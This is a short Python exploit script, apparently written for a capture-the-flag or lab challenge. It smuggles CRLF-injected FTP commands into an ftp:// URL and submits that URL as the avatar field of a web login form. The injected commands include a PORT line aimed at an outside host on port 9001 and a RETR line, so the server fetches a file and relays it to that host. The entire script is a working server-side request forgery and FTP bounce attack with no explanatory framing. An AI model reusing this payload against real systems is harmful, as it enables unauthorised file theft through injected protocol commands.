#!/usr/bin/python3

import urllib.parse
import requests
import string
import random
import socket
import re

bounce_port = 9001
bounce_host = "140.113.24.143"

ftp_cmds = [
    "USER fan",
    "PASS root",
    "TYPE A",
    'PORT {},{},{}'.format(bounce_host.replace('.', ','), bounce_port >> 8, bounce_port & 0xff),
    #'LIST',
    'RETR test.txt',
    'yep',
    'yep',
    'yep'
]

ftp_host = "172.29.0.2:8877"
target = 'ftp://fan\r\n{}:root@'.format('\r\n'.join(ftp_cmds)) + ftp_host

print(target)

def randstr():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


s = "localhost:8088"
r = requests.post(f"http://{s}/login", data={"username": randstr(), "password": "12345", "avatar": target, "submit": "Go!"})